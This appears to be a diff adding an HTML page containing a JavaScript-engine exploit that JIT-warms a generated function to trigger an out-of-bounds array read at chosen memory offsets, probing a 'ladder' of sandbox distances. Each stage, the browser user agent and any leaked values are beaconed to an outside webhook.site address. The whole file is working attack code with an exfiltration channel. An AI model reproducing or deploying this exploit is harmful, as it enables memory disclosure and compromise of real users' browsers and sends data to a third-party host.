@@ -1,0 +1,89 @@
+<html><body><script>
+// x1b: one distance per reboot, chosen by URL query (?k=N). Read-only far access attempt (leak channel).
+var SINK = 'https://webhook.site/049dead9-0020-41f4-83e7-942e265e5d6d';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,170)), {mode:'no-cors'}); } catch(e) {}
+}
+
+// offsets previously observed as MAPPED on this device first (+22..28 GiB), then the rest of the sandbox
+var LADDER = [
+  '0x160000000', // +22 GiB
+  '0x170000000', // +23 GiB
+  '0x180000000', // +24 GiB
+  '0x190000000', // +25 GiB
+  '0x1A0000000', // +26 GiB
+  '0x1B0000000', // +27 GiB
+  '0x1C0000000', // +28 GiB
+  '0x100000000', // +16 GiB
+  '0x200000000', // +32 GiB
+  '0x300000000', // +48 GiB
+  '0x400000000', // +64 GiB
+  '0x800000000', // +128 GiB
+  '0x1000000000' // +256 GiB
+];
+
+var q = {}, m;
+var re = /[?&]([^=&]+)=([^&]*)/g;
+while ((m = re.exec(location.search))) q[decodeURIComponent(m[1])] = decodeURIComponent(m[2]);
+var k = parseInt(q.k || '0', 10) || 0;
+if (k >= LADDER.length) k = 0;
+beacon('start', 'x1b k=' + k + ' C=' + LADDER[k] + ' ua=' + navigator.userAgent.slice(62, 96));
+
+function mk(C, withStore){
+  var b = [
+    'var oob_array = new Array(5);',
+    'oob_array[0] = 0x500;',
+    'let just_a_variable = fake[0];',
+    'let another_variable3 = fake[7];',
+    'if (a % 7 == 0) another_variable3 = ' + C + ';',
+    'another_variable3 = Math.max(another_variable3, tahir);',
+    'another_variable3 = another_variable3 >>> 0;',
+    'var index = fake[3];',
+    'var for_phi_modes = fake[6];',
+    'let c = fake[1];',
+    'for (var i = 0; i < 10; i++) {',
+    '  if (a % 3 == 0) just_a_variable = c;',
+    '  if (a % 37 == 0) just_a_variable = fake[2];',
+    '  if (a % 11 == 0) just_a_variable = fake[8];',
+    '  if (a % 17 == 0) just_a_variable = fake[5];',
+    '  if (a % 19 == 0) just_a_variable = fake[4];',
+    '  if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }',
+    '  if (i >= 6) {',
+    '    for (let j = 0; j < 5; j++) {',
+    '      if (a % 5 == 0) {',
+    '        index = for_phi_modes;',
+    withStore
+      ? '        oob_array[index] = 0x500; leaked = oob_array[index];'
+      : '        leaked = oob_array[index];',
+    '      }',
+    '    }',
+    '  }',
+    '  for_phi_modes = c;',
+    '  c = just_a_variable;',
+    '}',
+    'return [index, just_a_variable, leaked];'
+  ].join('\n');
+  return new Function('a', b);
+}
+
+var fake = new Uint32Array(10);
+for (var i = 0; i < 10; i++) fake[i] = i + 1;
+var tahir = 0x1, leaked = -1, arrx = new Array(150); arrx[0] = 1.1;
+
+try {
+  var T = mk(LADDER[k], false);
+  for (var w = 2; w < 0x500; w++) T(w);
+  for (var w2 = 0; w2 < 50000; w2++) T(w2 % 500 + 2);
+  beacon('warm-done', 'k=' + k);
+  leaked = -1;
+  var r = T(35);
+  beacon('probe', 'k=' + k + ' idx=' + String(r[0]) + ' v=' + String(r[1]) + ' leak=' + String(leaked));
+  // second read at an explicit bigger a to be sure the path is taken
+  leaked = -1;
+  var r2 = T(70);
+  beacon('probe70', 'k=' + k + ' leak=' + String(leaked));
+  beacon('survived', 'k=' + k + ' READPATH-OK');
+} catch (e) {
+  beacon('exc', 'k=' + k + ' ' + String(e.name) + ':' + String(e.message).slice(0,60));
+}
+</script></body></html>
